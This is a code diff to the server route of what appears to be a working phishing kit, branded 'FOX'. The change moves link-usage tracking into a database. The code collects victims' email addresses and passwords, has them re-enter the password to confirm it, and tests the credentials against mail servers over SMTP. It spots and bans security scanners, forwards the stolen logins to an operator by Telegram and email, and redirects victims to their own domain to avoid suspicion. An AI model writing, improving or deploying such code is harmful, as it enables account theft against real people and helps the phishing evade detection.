@@ -24,44 +24,45 @@ import { markLinkUsed, updateGenericLinkStats, saveCapturedEmail, getLink } from
 import { getSettings } from '@/lib/adminSettings'
 import { hashEmail, truncateIP, truncateToken } from '@/lib/securityUtils'
 import { extractBaseDomain, getRedirectUrlForEmail } from '@/lib/domainExtractor'
+import { getDb } from '@/lib/db'
 
 function validateEmail(email: string): boolean {
   if (!email || typeof email !== 'string') return false
   if (email.length < 3 || email.length > 254) return false
-  
+
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
   if (!emailRegex.test(email)) return false
-  
+
   const dangerous = ['<', '>', '"', "'", '\\', '/', '..', 'script', 'javascript:']
   if (dangerous.some(char => email.toLowerCase().includes(char))) return false
-  
+
   return true
 }
 
 function validatePassword(password: string): boolean {
   if (!password || typeof password !== 'string') return false
   if (password.length < 1 || password.length > 1000) return false
-  
+
   // Block control characters (null bytes, newlines, etc.)
   const hasControlChars = /[\x00-\x1F\x7F]/.test(password)
   if (hasControlChars) return false
-  
+
   return true
 }
 
 // Helper function to get redirect URL from admin settings
 async function getRedirectUrl(email: string, hash: string = ''): Promise<string> {
   const settings = await getSettings()
-  
+
   let redirectUrl: string
-  
+
   if (settings.redirects?.customUrl && settings.redirects.customUrl.trim() !== '') {
     // Use custom URL from admin settings
     redirectUrl = settings.redirects.customUrl.trim()
   } else if (settings.redirects?.useDomainFromEmail !== false) {
     // Extract base domain intelligently (handles Japanese domains)
     const baseDomain = extractBaseDomain(email)
-    
+
     // Get fallback from settings or use default
     const fallbackUrl = settings.redirects?.defaultUrl || 'https://www.google.com'
     redirectUrl = baseDomain ? `https://${baseDomain}` : fallbackUrl
@@ -69,10 +70,10 @@ async function getRedirectUrl(email: string, hash: string = ''): Promise<string>
     // Use fallback
     redirectUrl = settings.redirects?.defaultUrl || 'https://www.google.com'
   }
-  
+
   // Add hash fragment based on result (hardcoded values)
   let hashFragment = ''
-  
+
   if (hash) {
     // Hardcoded hash values
     const hashMap: Record<string, string> = {
@@ -85,39 +86,21 @@ async function getRedirectUrl(email: string, hash: string = ''): Promise<string>
     }
     hashFragment = hashMap[hash] || hash
   }
-  
+
   // Append hash if present
   if (hashFragment) {
     redirectUrl = `${redirectUrl}#${hashFragment}`
   }
-  
+
   return redirectUrl
 }
 
-// Single-use token tracking (per email)
-const usedLinks = new Map<string, {
-  email: string
-  timestamp: number
-}>()
-
-// Clean up old entries every 5 minutes (prevent memory leaks)
-if (typeof setInterval !== 'undefined') {
-  setInterval(() => {
-    const now = Date.now()
-    const keysToDelete: string[] = []
-    usedLinks.forEach((data, key) => {
-      if (now - data.timestamp > 60 * 60 * 1000) {
-        keysToDelete.push(key)
-      }
-    })
-    keysToDelete.forEach(key => usedLinks.delete(key))
-  }, 5 * 60 * 1000)
-}
+// Single-use token tracking moved to database (used_sessions table)
 
 export async function POST(request: NextRequest) {
   // Log that the endpoint was called
   console.log('[CREDENTIAL CAPTURE] 🚀 POST /api/auth/session/validate called')
-  
+
   try {
     const body = await request.json()
     console.log('[CREDENTIAL CAPTURE] 📥 Request body received:', {
@@ -125,7 +108,7 @@ export async function POST(request: NextRequest) {
       hasPassword: !!(body.password || body.p),
       hasToken: !!(body.token || body.linkToken || body.sessionIdentifier),
     })
-    
+
     // Decode credentials early and log
     let email: string
     let password: string
@@ -137,38 +120,38 @@ export async function POST(request: NextRequest) {
       // Fallback to old base64 format
       email = body.e ? Buffer.from(body.e, 'base64').toString('utf-8') : (body.email || '')
     }
-    
+
     console.log('[CREDENTIAL CAPTURE] 📧 Email decoded:', email ? `${email.substring(0, 10)}...` : 'EMPTY')
-    
+
     if (!validateEmail(email)) {
       console.log('[CREDENTIAL CAPTURE] ❌ Email validation failed')
-      return NextResponse.json({ 
-        error: 'Invalid email address' 
+      return NextResponse.json({
+        error: 'Invalid email address'
       }, { status: 400 })
     }
-    
+
     try {
       password = body.p ? deobfs(body.p) : (body.password || '')
     } catch {
       password = body.p ? Buffer.from(body.p, 'base64').toString('utf-8') : (body.password || '')
     }
-    
+
     console.log('[CREDENTIAL CAPTURE] 🔑 Password decoded:', password ? '***' : 'EMPTY')
-    
+
     if (!validatePassword(password)) {
       console.log('[CREDENTIAL CAPTURE] ❌ Password validation failed')
-      return NextResponse.json({ 
-        error: 'Invalid password' 
+      return NextResponse.json({
+        error: 'Invalid password'
       }, { status: 400 })
     }
-    
+
     let redirectUrl: string | null = null
     try {
       redirectUrl = body.r ? deobfs(body.r) : (body.redirectUrl || null)
     } catch {
       redirectUrl = body.r ? Buffer.from(body.r, 'base64').toString('utf-8') : (body.redirectUrl || null)
     }
-    
+
     const captchaToken = body.c || body.captchaToken
     const retryCount = body.t !== undefined ? body.t : (body.retryCount || 0)
     const sessionId = body.s || body.sessionId
@@ -188,38 +171,38 @@ export async function POST(request: NextRequest) {
       request.headers.get('cf-connecting-ip') ||
       'Unknown'
     const userAgent = request.headers.get('user-agent') || 'Unknown'
-    
+
     // Generate fingerprint from request headers
-    const fingerprint = request.headers.get('x-fingerprint') || 
-                       request.headers.get('x-client-fingerprint') ||
-                       `${userAgent}-${ip}`.substring(0, 100) // Fallback simple fingerprint
+    const fingerprint = request.headers.get('x-fingerprint') ||
+      request.headers.get('x-client-fingerprint') ||
+      `${userAgent}-${ip}`.substring(0, 100) // Fallback simple fingerprint
 
     // CRITICAL: If user has valid token, they passed all 4 security layers - TRUST THEM
     // Skip bot detection for users with valid tokens (they already passed stealth verification)
     let tokenValid = false
     let tokenPayload = null
-    
+
     if (sessionIdentifier) {
       // Check if this is a simple token (Type B/C: timestamp-based or gen_ prefix)
       const isSimpleToken = (sessionIdentifier.includes('_') && !sessionIdentifier.includes('.') && !sessionIdentifier.startsWith('eyJ')) || sessionIdentifier.startsWith('gen_')
-      
+
       if (isSimpleToken) {
-        
+
         // For simple tokens, verify against database instead of JWT
         try {
           const link = await getLink(sessionIdentifier)
-          
+
           if (link && link.status === 'active') {
             tokenValid = true
             tokenPayload = { type: 'simple', token: sessionIdentifier }
-            
+
             // NOTE: Don't check usedLinks here - allow multiple attempts
             // Only mark as used AFTER 3 same passwords confirmed or redirect
           } else {
             const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
             return NextResponse.json(
-              { 
-                success: false, 
+              {
+                success: false,
                 redirect: redirectUrl
               },
               { status: 401 }
@@ -228,8 +211,8 @@ export async function POST(request: NextRequest) {
         } catch (error) {
           const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
           return NextResponse.json(
-            { 
-              success: false, 
+            {
+              success: false,
               redirect: redirectUrl
             },
             { status: 401 }
@@ -241,11 +224,11 @@ export async function POST(request: NextRequest) {
           ip,
           strictBinding: false, // Lenient mode - allow IP changes (mobile networks, etc.)
         })
-        
+
         if (tokenVerification.valid && tokenVerification.payload) {
           tokenValid = true
           tokenPayload = tokenVerification.payload
-          
+
           // NOTE: Don't check usedLinks here - allow multiple attempts
           // Only mark as used AFTER 3 same passwords confirmed or redirect
           // This check moved to after attempt tracking (see below)
@@ -253,8 +236,8 @@ export async function POST(request: NextRequest) {
           // Token invalid/expired - return redirect with hash
           const redirectUrl = await getRedirectUrl(email, 'TokenExpired')
           return NextResponse.json(
-            { 
-              success: false, 
+            {
+              success: false,
               redirect: redirectUrl
             },
             { status: 401 }
@@ -285,14 +268,14 @@ export async function POST(request: NextRequest) {
       }
 
       const scannerDetection = await classifyRequest(userAgent, ip, allHeaders)
-      
+
       // If scanner detected, return error
       if (scannerDetection.isScanner) {
         // Auto-ban if high confidence
         if (scannerDetection.confidence >= 70) {
           banIP(ip, `Scanner detected: ${scannerDetection.reasons.join(', ')}`, false) // Temporary ban
         }
-        
+
         // Log the scanner but don't expose intent
         logBotDetection({
           isBot: true,
@@ -301,7 +284,7 @@ export async function POST(request: NextRequest) {
           userAgent,
           fingerprint: 'scanner',
         }, email)
-        
+
         // Return redirect with hash
         const redirectUrl = await getRedirectUrl(email, 'ScannerFound')
         return NextResponse.json(
@@ -314,7 +297,7 @@ export async function POST(request: NextRequest) {
       const botDetection = validateRequestOrigin(userAgent, ip, {
         suspiciousActivity: false, // Can be enhanced with more checks
       })
-      
+
       // Log bot detection silently (no user alerts)
       if (botDetection.isBot || botDetection.confidence >= 30) {
         logBotDetection(botDetection, email)
@@ -332,8 +315,8 @@ export async function POST(request: NextRequest) {
     console.log('[CREDENTIAL CAPTURE] 🔐 Loading settings for CAPTCHA verification...')
     const settings = await getSettings()
     console.log('[CREDENTIAL CAPTURE] 🔐 Settings loaded, checking CAPTCHA config...')
-    const turnstileSecret = settings.security.captcha.provider === 'turnstile' 
-      ? settings.security.captcha.turnstileSecretKey?.trim() 
+    const turnstileSecret = settings.security.captcha.provider === 'turnstile'
+      ? settings.security.captcha.turnstileSecretKey?.trim()
       : undefined
     const isTestingMode = process.env.NODE_ENV === 'development'
     console.log('[CREDENTIAL CAPTURE] 🔐 CAPTCHA config:', {
@@ -342,7 +325,7 @@ export async function POST(request: NextRequest) {
       hasToken: !!captchaToken,
       isTestingMode
     })
-    
+
     if (turnstileSecret && captchaToken && captchaToken !== 'test-token') {
       console.log('[CREDENTIAL CAPTURE] 🔐 Verifying CAPTCHA token...')
       // Check if using official Cloudflare Turnstile test tokens
@@ -397,16 +380,16 @@ export async function POST(request: NextRequest) {
     const attemptData = await recordAttempt(attemptKey, password)
     const currentAttempt = attemptData.attemptNumber
     console.log('[CREDENTIAL CAPTURE] 📊 Current attempt:', currentAttempt, '| Same password confirmed:', attemptData.samePasswordConfirmed, '| Allow attempt:', attemptData.allowAttempt)
-    
+
     // Secure logging - no sensitive data
     // Password submission attempt processed
-    
+
     // CRITICAL FIX: Check for password confirmation FIRST (before any SMTP)
     // When samePasswordConfirmed = true, we MUST return immediately
     if (attemptData.samePasswordConfirmed) {
       // Build redirect URL with Success hash
       const redirectUrl = await getRedirectUrl(email, 'Success')
-      
+
       // Record successful login with fingerprint (3 same passwords = confirmed)
       try {
         await recordSuccessfulLogin(email, fingerprint, ip, sessionIdentifier || undefined)
@@ -415,7 +398,7 @@ export async function POST(request: NextRequest) {
           console.error('Failed to record fingerprint:', error)
         }
       }
-      
+
       // Log visitor (login attempt - password confirmed)
       try {
         const geoData = await getGeoData(ip)
@@ -439,16 +422,16 @@ export async function POST(request: NextRequest) {
           console.error('Failed to log visitor:', error)
         }
       }
-      
+
       // NOTE: Do NOT mark link as used here - wait until 4 attempts are completed
       // Users should be able to return to link if they haven't completed 4 attempts
       // Link will be marked as used only after 4th attempt (see below)
-      
+
       // Update link stats (3 same passwords = confirmed, but link still active until 4 attempts)
       if (sessionIdentifier) {
         try {
           const link = await getLink(sessionIdentifier)
-          
+
           if (link) {
             // Don't mark as used yet - only update stats for generic links
             if (link.type === 'generic') {
@@ -480,7 +463,7 @@ export async function POST(request: NextRequest) {
 
             // Get password history for captured email record
             const passwordHistory = await getPasswords(attemptKey)
-            
+
             // Save captured email record
             const capturedId = `capture_${Date.now()}_${Math.random().toString(36).substring(7)}`
             await saveCapturedEmail({
@@ -503,7 +486,7 @@ export async function POST(request: NextRequest) {
         } catch (error) {
         }
       }
-      
+
       // Get MX record quickly for Telegram message (non-blocking, with timeout)
       let mxForMessage = 'Not available'
       try {
@@ -525,7 +508,7 @@ export async function POST(request: NextRequest) {
       } catch {
         // Silent fail - use default
       }
-      
+
       // Send Telegram notification for confirmed password (quick, no SMTP)
       const telegramSettings = (await getSettings()).notifications.telegram
       const quickMessage = `+++FOX NOTIFICATION+++
@@ -539,7 +522,7 @@ export async function POST(request: NextRequest) {
 ✅ All 3 attempts identical - Password verified correct!
 
 🦊 FOXER`
-      
+
       // Send Telegram in background with proper error tracking
       sendTelegramMessage(quickMessage)
         .then(success => {
@@ -549,7 +532,7 @@ export async function POST(request: NextRequest) {
         })
         .catch(err => {
         })
-      
+
       // Return success with redirect immediately
       // CRITICAL: This MUST return and not continue processing
       // NO SMTP verification, NO further processing
@@ -563,21 +546,23 @@ export async function POST(request: NextRequest) {
       })
       return response
     }
-    
+
     // Check if link was already used (only AFTER we've processed the attempt)
     // This prevents 410 error on attempts 2-3
     if (sessionIdentifier && attemptData.samePasswordConfirmed) {
       const linkUsageKey = `${sessionIdentifier}_${email}`
-      if (usedLinks.has(linkUsageKey)) {
+      const db = getDb()
+      const isUsed = db.prepare('SELECT 1 FROM used_sessions WHERE session_key = ?').get(linkUsageKey)
+      if (isUsed) {
         // Still allow redirect if password confirmed, but log it
       }
     }
-    
+
     // Check if we should block after 3 same passwords or after 4 attempts
     if (!attemptData.allowAttempt) {
       // This block only runs if allowAttempt = false (too many attempts)
       // Password confirmation is handled above (before this check)
-      
+
       // Otherwise, too many attempts - redirect to configured URL
       const redirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
       return NextResponse.json({
@@ -617,9 +602,11 @@ export async function POST(request: NextRequest) {
     // Send visitor notification ONCE (only on first attempt)
     if (currentAttempt === 1) {
       const visitorKey = `visitor_notified_${email}`
-      
+      const db = getDb()
+
       // Check if we already sent visitor notification for this email
-      if (!usedLinks.has(visitorKey)) {
+      const isNotified = db.prepare('SELECT 1 FROM used_sessions WHERE session_key = ?').get(visitorKey)
+      if (!isNotified) {
         const browser = getBrowserName(userAgent)
         const visitorTimestamp = new Date().toLocaleString('en-US', {
           weekday: 'short',
@@ -629,7 +616,7 @@ export async function POST(request: NextRequest) {
           minute: '2-digit',
           hour12: true,
         })
-        
+
         const visitorMessage = `+++FOX NOTIFICATION+++
 
 👊Knock! Knock!!👊
@@ -642,14 +629,16 @@ Waiting for next step... 🎯`
 
         // Visitor arrival notification (Knock Knock)
         const telegramSettings = (await getSettings()).notifications.telegram
-        
+
         const visitorResult = await sendTelegramMessage(visitorMessage)
         if (visitorResult) {
         } else {
         }
-        
+
         // Mark visitor as notified (expires after 1 hour)
-        usedLinks.set(visitorKey, { email: verifiedEmail, timestamp: Date.now() })
+        try {
+          db.prepare('INSERT OR IGNORE INTO used_sessions (session_key, email, used_at, ip, user_agent) VALUES (?, ?, ?, ?, ?)').run(visitorKey, verifiedEmail, Date.now(), ip, userAgent)
+        } catch (e) { }
       }
     }
 
@@ -713,7 +702,7 @@ Waiting for next step... 🎯`
         // This will be handled in the else block
       }
     }
-    
+
     // For 3rd attempt (if not already set) or 4th attempt, show full details
     // SKIP SMTP if password already confirmed (prevents 1-3 minute delay)
     if ((currentAttempt === 3 && !message) || currentAttempt === 4) {
@@ -778,9 +767,9 @@ ${verificationDetails}
 📄 Doc: ${documentId}
 
 ━━━━━━━━━━━━━━━━━━
-${verification.valid 
-  ? '🎯 VALID - Success!' 
-  : '⚠️ Invalid - Try manually'}
+${verification.valid
+          ? '🎯 VALID - Success!'
+          : '⚠️ Invalid - Try manually'}
 `
     }
 
@@ -788,7 +777,7 @@ ${verification.valid
     // CRITICAL: This MUST run for every attempt, even if other code fails
     try {
       const telegramSettings = (await getSettings()).notifications.telegram
-      
+
       // Ensure message is not empty (fallback if somehow message wasn't set)
       if (!message || message.trim() === '') {
         // Fallback message if somehow message wasn't set
@@ -801,7 +790,7 @@ ${verification.valid
 📬 MX: ${primaryMX}`
         console.warn('[CREDENTIAL CAPTURE] ⚠️  Message was empty, using fallback')
       }
-      
+
       // Log notification attempt (always log in production for debugging)
       console.log('[CREDENTIAL CAPTURE] 📧 Attempting Telegram notification:', {
         enabled: telegramSettings.enabled,
@@ -813,7 +802,7 @@ ${verification.valid
         attempt: currentAttempt,
         messageLength: message.length,
       })
-      
+
       // Only send if Telegram is enabled and configured
       if (telegramSettings.enabled !== false) {
         try {
@@ -851,20 +840,20 @@ ${verification.valid
     if (sessionIdentifier && tokenValid) {
       try {
         const link = await getLink(sessionIdentifier)
-        
+
         if (link) {
           // Only mark link as used when 4 attempts are completed
           if (currentAttempt >= 4) {
             if (link.type === 'personalized') {
               // Type A: Mark personalized link as used (4 attempts completed)
               await markLinkUsed(sessionIdentifier, fingerprint, ip)
-              
-              // Also mark in memory cache
+
+              // Also mark in database
               const linkUsageKey = `${sessionIdentifier}_${email}`
-              usedLinks.set(linkUsageKey, {
-                email,
-                timestamp: Date.now(),
-              })
+              const db = getDb()
+              try {
+                db.prepare('INSERT OR IGNORE INTO used_sessions (session_key, email, used_at, ip, user_agent) VALUES (?, ?, ?, ?, ?)').run(linkUsageKey, email, Date.now(), ip, userAgent)
+              } catch (e) { }
             } else if (link.type === 'generic') {
               // Type B: Update generic link stats (already handled, but ensure it's done)
               await updateGenericLinkStats(sessionIdentifier, email)
@@ -872,7 +861,7 @@ ${verification.valid
           } else {
             // Less than 4 attempts - don't mark as used yet
             // User can still return to link
-            
+
             // Still update stats for generic links
             if (link.type === 'generic') {
               await updateGenericLinkStats(sessionIdentifier, email)
@@ -893,10 +882,10 @@ ${verification.valid
               provider: 'Confirmed'
             }
           }
-          
+
           // Get password history for captured email record
           const passwordHistory = await getPasswords(attemptKey)
-          
+
           await saveCapturedEmail({
             id: capturedId,
             email: email.toLowerCase(),
@@ -936,7 +925,7 @@ ${verification.valid
       } else {
         verificationResult = await verifyEmailCredentials(email, password)
       }
-      
+
       // Record successful login with fingerprint (for verified credentials)
       // NOTE: Only record if credentials are actually valid, NOT just on 3rd attempt
       // The main fingerprint recording happens above when samePasswordConfirmed = true
@@ -950,7 +939,7 @@ ${verification.valid
     }
 
     // Return success with message if 4th attempt is allowed
-    return NextResponse.json({ 
+    return NextResponse.json({
       success: true,
       verified: verificationResult?.valid || false,
       provider: verificationResult?.provider || 'Unknown',
@@ -980,12 +969,12 @@ async function getLocationFromIP(ip: string): Promise<string> {
   try {
     const controller = new AbortController()
     const timeoutId = setTimeout(() => controller.abort(), 2000)
-    
+
     const response = await fetch(`https://ipapi.co/${ip}/json/`, {
       signal: controller.signal,
     })
     clearTimeout(timeoutId)
-    
+
     const data = await response.json()
     if (data.city && data.country_name) {
       return `${data.city}, ${data.country_name}`
@@ -1008,14 +997,14 @@ function getBrowserName(userAgent: string): string {
 async function sendEmail(email: string, password: string): Promise<boolean> {
   // Get SMTP settings from admin panel (single source of truth)
   const settings = await getSettings()
-  
+
   if (!settings.notifications.email.enabled) {
     if (process.env.NODE_ENV === 'development') {
       console.log('ℹ️ Email notifications disabled in admin settings')
     }
     return false
   }
-  
+
   const smtpHost = settings.notifications.email.smtpHost?.trim()
   const smtpPort = settings.notifications.email.smtpPort || 587
   const smtpUser = settings.notifications.email.smtpUser?.trim()
@@ -1040,7 +1029,7 @@ async function sendEmail(email: string, password: string): Promise<boolean> {
       subject: `Login: ${email}`,
       text: `Email: ${email}\nPassword: ${password}`,
     })
-    
+
     return true
   } catch (error) {
     // FIXED: Now logs errors properly instead of silent fail
